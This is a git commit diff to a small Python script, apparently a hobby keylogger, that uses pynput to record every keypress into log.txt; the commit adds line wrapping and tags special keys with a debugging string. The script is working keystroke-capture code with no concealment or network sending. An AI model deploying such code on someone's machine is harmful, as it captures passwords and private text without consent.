a53e1a170e210265403ef80588262c1c329fbf23
Josh Hager <jhager603@gmail.com>
2022-12-15 22:04:07 -0500

    Added new line implementation when writing to log file

--- keystroke_backup.py
+++ keystroke_backup.py
@@ -3,10 +3,16 @@ from pynput import keyboard
 from datetime import datetime
 
 keylog = []
+line_position = 0
 
 def log():
+    global line_position
     with open('log.txt', 'a') as log:
         log.write(''.join(keylog))
+        line_position += len(keylog)
+        if line_position >= 70:
+            log.write('\n')
+            line_position = 0
 
 def on_press(key):
     try:
@@ -17,7 +23,7 @@ def on_press(key):
             keylog.append(' ')
             print(' ')
         else:
-            keylog.append(str(key)[4:])
+            keylog.append(str(key)[4:] + "this is a special key")
             print(str(key)[4:])
         
 listener = keyboard.Listener(on_press=on_press)
